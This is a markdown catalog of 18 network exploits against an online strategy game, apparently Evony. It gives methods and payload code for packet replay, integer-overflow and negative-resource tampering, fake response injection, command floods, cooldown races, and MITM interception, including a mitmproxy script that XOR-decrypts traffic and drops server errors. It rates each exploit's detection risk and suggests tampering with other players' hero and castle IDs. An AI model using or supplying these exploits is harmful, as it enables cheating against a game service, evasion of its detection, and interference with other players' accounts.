# ðŸŒ NETWORK EXPLOIT CATALOG

**Total Network Exploits:** 18

## Summary by Type
- **packet_modify**: 3
- **parameter_tamper**: 3
- **packet_replay**: 2
- **packet_inject**: 2
- **sequence_break**: 2
- **flood_attack**: 2
- **timing_attack**: 2
- **mitm_intercept**: 2

---

## PACKET REPLAY

### Troop Training Replay
**Target Command:** `troop.produceTroop`  
**Detection Risk:** LOW - Identical requests common  
**Cheat Result:** Train 10x troops from single request

**Description:**
Capture and replay troop training packet

**Method:**
```

1. Capture packet for troop.produceTroop
2. Save raw AMF bytes
3. Replay packet multiple times
4. Server may process each as new request
5. Train troops without client validation

```

**Payload Example:**
```python

# Captured packet structure
{
    "cmd": "troop.produceTroop",
    "params": {
        "castleId": 12345,
        "troopType": 6,  # Archer
        "num": 1000
    }
}

# Replay 10 times = 10,000 archers
for i in range(10):
    socket.send(captured_packet)

```

---

### Resource Collection Replay
**Target Command:** `interior.taxRate (exploit variant)`  
**Detection Risk:** MEDIUM - Unusual collection frequency  
**Cheat Result:** Multiply resource collection

**Description:**
Replay resource collection to multiply gains

**Method:**
```

1. Capture tax collection or resource harvest
2. Replay packet rapidly
3. May collect multiple times

```

**Payload Example:**
```python

# Capture gold collection packet
# Replay before server updates state

```

---

## PACKET MODIFY

### Troop Count Modification
**Target Command:** `troop.produceTroop`  
**Detection Risk:** LOW - Server trusts client values  
**Cheat Result:** Free troops via integer overflow

**Description:**
Modify num parameter to bypass client limits

**Method:**
```

1. Intercept outgoing troop.produceTroop
2. Modify 'num' parameter
3. Set to overflow value (6135037 for archers)
4. Forward modified packet
5. Trigger integer overflow

```

**Payload Example:**
```python

# Original packet
{"cmd": "troop.produceTroop", "params": {"num": 100}}

# Modified packet (overflow threshold)
{"cmd": "troop.produceTroop", "params": {"num": 6135037}}

# Cost: 6135037 * 350 = 2,147,262,950 (overflows to ~-2B)

```

---

### Negative Resource Transport
**Target Command:** `army.newArmy`  
**Detection Risk:** MEDIUM - Unusual values logged  
**Cheat Result:** Drain target's resources or gain resources

**Description:**
Send negative resources to steal from target

**Method:**
```

1. Intercept transport army creation
2. Modify resource string to negative values
3. Server may interpret as receiving resources

```

**Payload Example:**
```python

# Normal transport
{"cmd": "army.newArmy", "params": {
    "missionType": 4,
    "resource": "1000,1000,1000,1000,1000"
}}

# Exploit - negative values
{"cmd": "army.newArmy", "params": {
    "missionType": 4,
    "resource": "-999999,-999999,-999999,-999999,-999999"
}}

```

---

### Building Level Skip
**Target Command:** `castle.upgradeBuilding`  
**Detection Risk:** HIGH - Server likely validates  
**Cheat Result:** Skip building requirements

**Description:**
Modify building parameters to skip requirements

**Method:**
```

1. Intercept upgrade request
2. Modify to claim higher level completion
3. Server may not fully validate requirements

```

**Payload Example:**
```python

# If server accepts level in request
{"cmd": "castle.upgradeBuilding", "params": {
    "positionId": 1001,
    "targetLevel": 10  # Jump straight to 10
}}

```

---

## PACKET INJECT

### Fake Server Response Injection
**Target Command:** `(response injection)`  
**Detection Risk:** NONE client-side  
**Cheat Result:** Display unlimited troops (visual only)

**Description:**
Inject fake server responses to client

**Method:**
```

1. MITM position between client and server
2. Craft fake server response
3. Inject to client before real response
4. Client accepts fake data

```

**Payload Example:**
```python

# Fake troop update response
{
    "event": "SERVER_TROOP_UPDATE",
    "data": {
        "troop": {
            "archer": 999999999,
            "catapult": 999999999
        }
    }
}
# Client displays fake troop counts

```

---

### Resource Response Injection
**Target Command:** `SERVER_RESOURCE_UPDATE`  
**Detection Risk:** NONE client-side  
**Cheat Result:** Display unlimited resources

**Description:**
Inject fake resource values

**Method:**
```

1. Intercept SERVER_RESOURCE_UPDATE
2. Modify resource amounts
3. Forward to client
4. Client shows unlimited resources

```

**Payload Example:**
```python

# Inject modified resource update
{
    "gold": {"amount": 2147483647},
    "food": {"amount": 2147483647},
    "wood": {"amount": 2147483647},
    "stone": {"amount": 2147483647},
    "iron": {"amount": 2147483647}
}

```

---

## SEQUENCE BREAK

### Command Sequence Skip
**Target Command:** `(multiple commands)`  
**Detection Risk:** MEDIUM - Missing state updates  
**Cheat Result:** Bypass multi-step validations

**Description:**
Skip prerequisite commands

**Method:**
```

1. Normally: check -> request -> confirm
2. Skip directly to confirm/action
3. Bypass prerequisite checks

```

**Payload Example:**
```python

# Skip building check, send upgrade directly
# Skip hero hire, send assignment directly
# Skip research check, send complete directly

```

---

### Out-of-Order Army Commands
**Target Command:** `army.*`  
**Detection Risk:** MEDIUM  
**Cheat Result:** Potential resource duplication

**Description:**
Send army commands in unexpected order

**Method:**
```

1. Send army recall before army arrives
2. Send attack completion before march
3. Server state desync may allow exploits

```

**Payload Example:**
```python

# Send in wrong order
send("army.newArmy", {...})  # Create army
send("army.callBackArmy", {...})  # Recall immediately
# Troops may duplicate or resources refund

```

---

## FLOOD ATTACK

### Command Flood
**Target Command:** `(any command)`  
**Detection Risk:** HIGH - Rate limit detection  
**Cheat Result:** Bypass cooldowns, multiply actions

**Description:**
Rapidly send same command before server processes

**Method:**
```

1. Disable client-side cooldowns
2. Send commands as fast as possible
3. Server queue may process all before validation

```

**Payload Example:**
```python

import socket
# Flood troop training
for _ in range(1000):
    s.send(train_packet)
    # No delay, maximum speed

```

---

### Scout Flood
**Target Command:** `army.newArmy (scout)`  
**Detection Risk:** MEDIUM  
**Cheat Result:** Scout entire map rapidly

**Description:**
Send unlimited scouts simultaneously

**Method:**
```

1. Rapid-fire scout commands
2. Before server applies scout limit
3. May send more scouts than allowed

```

**Payload Example:**
```python

# Flood scout missions
for target in targets:
    send("army.newArmy", {
        "missionType": 3,  # Scout
        "targetX": target[0],
        "targetY": target[1]
    })

```

---

## TIMING ATTACK

### Cooldown Race
**Target Command:** `(cooldown-limited commands)`  
**Detection Risk:** LOW  
**Cheat Result:** Bypass cooldown by milliseconds

**Description:**
Send command exactly when cooldown expires

**Method:**
```

1. Track server cooldown precisely
2. Send command at exact millisecond of expiry
3. May process before cooldown check

```

**Payload Example:**
```python

# Wait for exact cooldown end
import time
cooldown_end = time.time() + server_cooldown
time.sleep(cooldown_end - time.time() - 0.001)
send_command()  # Race the cooldown

```

---

### Server Time Desync
**Target Command:** `(time-based commands)`  
**Detection Risk:** LOW  
**Cheat Result:** Early action execution

**Description:**
Exploit client-server time difference

**Method:**
```

1. Determine server time offset
2. Send commands timed for server's future
3. May process before local display updates

```

**Payload Example:**
```python

# If server is 100ms ahead
# Send building complete before client shows done
# May trigger double rewards

```

---

## MITM INTERCEPT

### Full Packet Interception
**Target Command:** `(all traffic)`  
**Detection Risk:** NONE - Passive  
**Cheat Result:** Complete protocol understanding

**Description:**
Intercept and log all game traffic

**Method:**
```

1. Set up proxy (Burp, mitmproxy, custom)
2. Configure client to use proxy
3. Decrypt AMF packets (XOR 0xAA)
4. Log all commands and responses
5. Analyze for exploit opportunities

```

**Payload Example:**
```python

# mitmproxy script
from mitmproxy import ctx

def request(flow):
    if "evony" in flow.request.host:
        # Decrypt XOR
        data = bytes([b ^ 0xAA for b in flow.request.content])
        ctx.log.info(f"Request: {data}")

def response(flow):
    if "evony" in flow.request.host:
        data = bytes([b ^ 0xAA for b in flow.response.content])
        ctx.log.info(f"Response: {data}")

```

---

### Selective Packet Drop
**Target Command:** `(failure responses)`  
**Detection Risk:** MEDIUM - State desync  
**Cheat Result:** Client ignores failures

**Description:**
Drop server error responses

**Method:**
```

1. MITM position
2. Identify error/failure responses
3. Drop them, don't forward to client
4. Client thinks action succeeded

```

**Payload Example:**
```python

def response(flow):
    data = decrypt(flow.response.content)
    if '"ok": 0' in data or '"error"' in data:
        flow.kill()  # Drop error response

```

---

## PARAMETER TAMPER

### Hero ID Tampering
**Target Command:** `hero.* commands`  
**Detection Risk:** HIGH - Permission check likely  
**Cheat Result:** Manipulate other players' heroes

**Description:**
Use other player's hero IDs

**Method:**
```

1. Obtain other player's hero IDs (from reports/battles)
2. Send commands with their hero IDs
3. May affect their heroes

```

**Payload Example:**
```python

# Use captured enemy hero ID
{"cmd": "hero.fireHero", "params": {"heroId": 999888}}
# May fire their hero (unlikely but worth testing)

```

---

### Castle ID Tampering
**Target Command:** `castle.* commands`  
**Detection Risk:** HIGH - Ownership check likely  
**Cheat Result:** Control other players' castles

**Description:**
Send commands for other castles

**Method:**
```

1. Obtain other player's castle IDs
2. Send commands targeting their castle
3. Server may not validate ownership

```

**Payload Example:**
```python

# Train troops in enemy castle?
{"cmd": "troop.produceTroop", "params": {
    "castleId": 987654,  # Enemy castle
    "troopType": 6,
    "num": 1000
}}

```

---

### Coordinate Boundary Bypass
**Target Command:** `army.newArmy`  
**Detection Risk:** MEDIUM  
**Cheat Result:** Server error or boundary exploit

**Description:**
Send armies to out-of-bounds coordinates

**Method:**
```

1. Normal coords: 0-799, 0-799
2. Try negative or >799 coords
3. May cause server errors or exploits

```

**Payload Example:**
```python

# Out of bounds coordinates
{"cmd": "army.newArmy", "params": {
    "targetX": -1,
    "targetY": 999
}}
# Or
{"cmd": "army.newArmy", "params": {
    "targetX": 2147483647,  # MAX_INT
    "targetY": 2147483647
}}

```

---
